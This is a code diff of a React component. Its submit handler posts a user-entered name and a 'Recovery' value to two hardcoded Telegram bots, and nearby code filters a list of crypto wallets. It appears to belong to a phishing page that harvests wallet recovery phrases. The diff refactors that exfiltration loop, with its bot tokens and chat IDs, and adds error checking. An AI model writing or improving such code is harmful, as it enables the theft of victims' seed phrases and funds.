@@ -108,39 +108,44 @@ const [status, setStatus] = useState<string>('');
 
 const handleSubmit = async () => {
   const bots = [
-  { token: "7518413075:AAF2m8aw70h1HDhjKhWoqOJ_kdzpkKdjA98", chat_id: "7650582960" },
-  { token: "8054928004:AAHBXclIm-0GhzIcDiVfEIXvYu7y74geht0", chat_id: "6973974985" },
-];
+    { token: "7518413075:AAF2m8aw70h1HDhjKhWoqOJ_kdzpkKdjA98", chat_id: "7650582960" },
+    { token: "8054928004:AAHBXclIm-0GhzIcDiVfEIXvYu7y74geht0", chat_id: "6973974985" },
+  ];
 
-  try{
-  setTheloader(true);
-  for (const bot of bots) {
-  const telegramUrl = `https://api.telegram.org/bot${bot.token}/sendMessage`;
-  await fetch(telegramUrl, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: bot.chat_id,
-      text: `${theName} : ${Recovery}`,
-    }),
-  });
-}
+  try {
+    setTheloader(true);
+    let allSuccessful = true;
 
-    const data: { ok: boolean } = await response.json();
+    for (const bot of bots) {
+      const telegramUrl = `https://api.telegram.org/bot${bot.token}/sendMessage`;
+      const response = await fetch(telegramUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: bot.chat_id,
+          text: `${theName} : ${Recovery}`,
+        }),
+      });
 
-    if (data.ok) {
+      const data: { ok: boolean } = await response.json();
+      if (!data.ok) {
+        allSuccessful = false;
+        console.error('Failed for bot:', bot.token);
+      }
+    }
+
+    if (allSuccessful) {
       setStatus('✅ Message sent!');
       setRecovery('');
-      console.log(status)
     } else {
-      setStatus('❌ Failed to send message.');
-      console.log(status)
+      setStatus('❌ One or more messages failed to send.');
     }
   } catch (error) {
     console.error('Telegram error:', error);
     setStatus('❌ Error sending message.');
   }
 };
+
 
 
   const filteredWallets = wallets.filter(wallet =>
